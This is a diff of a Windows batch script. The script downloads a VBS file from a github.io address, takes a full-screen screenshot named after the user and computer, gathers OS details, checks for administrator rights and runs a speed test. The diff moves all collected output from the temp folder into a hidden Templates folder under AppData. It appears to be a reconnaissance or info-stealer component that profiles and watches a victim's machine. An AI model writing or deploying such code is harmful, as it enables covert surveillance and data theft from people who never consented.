@@ -24,18 +24,18 @@ cd "%AppData%\Microsoft\Windows\Templates"
 
 curl.exe %proxy% https://cryptedlumos.github.io/Capture/osinfo.vbs --output "%AppData%\Microsoft\Windows\Templates\osinfo.vbs"
 nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
-cscript.exe /nologo osinfo.vbs > "%temp%\%username%@%computername%.txt"
-echo      =================== >> "%temp%\%username%@%computername%.txt"
-echo      Admin Rights Check: >> "%temp%\%username%@%computername%.txt"
-echo      =================== >> "%temp%\%username%@%computername%.txt"
+cscript.exe /nologo osinfo.vbs > "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
+echo      =================== >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
+echo      Admin Rights Check: >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
+echo      =================== >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
 NET SESSION >nul 2>&1
 IF %ERRORLEVEL% EQU 0 (
-ECHO      Administrator PRIVILEGES Detected! >> "%temp%\%username%@%computername%.txt"
+ECHO      Administrator PRIVILEGES Detected! >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
 ) ELSE (
-ECHO      NOT AN ADMIN! >> "%temp%\%username%@%computername%.txt"
+ECHO      NOT AN ADMIN! >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
 )
-"%appdata%\Ookla\Speedtest CLI\speedtest.exe" >> "%temp%\%username%@%computername%.txt"
-echo      =================== >> "%temp%\%username%@%computername%.txt"
+"%appdata%\Ookla\Speedtest CLI\speedtest.exe" >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
+echo      =================== >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
 
 for /f "tokens=2 delims==" %%G in ('wmic os get Caption /value') do ( 
     set WinEdition=%%G
